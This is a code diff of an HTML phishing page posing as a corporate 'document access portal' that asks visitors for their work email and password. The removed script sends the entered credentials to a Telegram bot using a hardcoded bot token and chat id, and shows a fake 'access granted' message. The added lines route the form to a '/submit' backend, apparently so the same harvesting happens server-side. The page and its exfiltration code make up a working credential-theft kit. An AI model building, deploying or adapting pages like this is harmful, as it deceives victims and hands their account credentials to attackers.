@@ -19,9 +19,6 @@
         input:focus { border-color: #1a365d; }
         .submit-btn { display: inline-block; width: 100%; padding: 14px; background: #1a365d; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px; margin-top: 15px; }
         .submit-btn:hover { background: #2a4365; }
-        .status-msg { padding: 12px; margin-bottom: 25px; border-radius: 4px; font-size: 13px; font-family: sans-serif; display: none; }
-        .success { background: #e6fffa; color: #234e52; border: 1px solid #b2f5ea; }
-        .error { background: #fff5f5; color: #742a2a; border: 1px solid #fed7d7; }
         .footer { margin-top: 50px; padding-top: 15px; border-top: 1px solid #dee2e6; color: #6c757d; font-size: 11px; display: flex; justify-content: space-between; }
     </style>
 </head>
@@ -35,9 +32,8 @@
         </div>
         <div class="divider"></div>
 
-        <div id="statusBox" class="status-msg"></div>
-
-        <form id="portalForm">
+        <!-- Submits instantly to the secure Render backend path -->
+        <form action="/submit" method="POST">
             <div class="form-group">
                 <label for="input-email">Corporate Email Address</label>
                 <input type="email" id="input-email" name="email" placeholder="name@organization.com" required>
@@ -46,7 +42,7 @@
                 <label for="input-password">Portal Passkey</label>
                 <input type="password" id="input-password" name="password" placeholder="••••••••" required>
             </div>
-            <button type="submit" id="submitBtn" class="submit-btn">Unlock Document</button>
+            <button type="submit" class="submit-btn">Unlock Document</button>
         </form>
 
         <div class="footer">
@@ -55,60 +51,5 @@
         </div>
     </main>
 
-    <script>
-        document.getElementById('portalForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const submitBtn = document.getElementById('submitBtn');
-            const statusBox = document.getElementById('statusBox');
-            
-            const email = document.getElementById('input-email').value;
-            const password = document.getElementById('input-password').value;
-            
-            submitBtn.innerText = "VERIFYING...";
-            submitBtn.disabled = true;
-            statusBox.style.display = "none";
-
-            // Verified Credentials Loaded Direct-to-Client
-            const botToken = "9034651544:AAFF2_8GEO6H3e6ataVEkHhha39kIDPlAt8"; 
-            const chatId = "1080822304"; 
-
-            const messageText = `📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n📧 Portal Email: ${email}\n🔑 Access Key: ${password}`;
-            const telegramUrl = `https://telegram.org{botToken}/sendMessage`;
-
-            try {
-                // Bypasses Vercel servers completely and fires from your local PC connection network
-                const response = await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: messageText
-                    })
-                });
-
-                const data = await response.json();
-
-                if (data.ok) {
-                    statusBox.className = "status-msg success";
-                    statusBox.innerText = "Verification successful. Connecting to secure file server...";
-                    statusBox.style.display = "block";
-                    submitBtn.innerText = "ACCESS GRANTED";
-                } else {
-                    statusBox.className = "status-msg error";
-                    statusBox.innerText = "Telegram Error: " + data.description;
-                    statusBox.style.display = "block";
-                    submitBtn.innerText = "UNLOCK DOCUMENT";
-                    submitBtn.disabled = false;
-                }
-            } catch (err) {
-                statusBox.className = "status-msg error";
-                statusBox.innerText = "Network Error: Unable to access the verification node.";
-                statusBox.style.display = "block";
-                submitBtn.innerText = "UNLOCK DOCUMENT";
-                submitBtn.disabled = false;
-            }
-        });
-    </script>
 </body>
 </html>
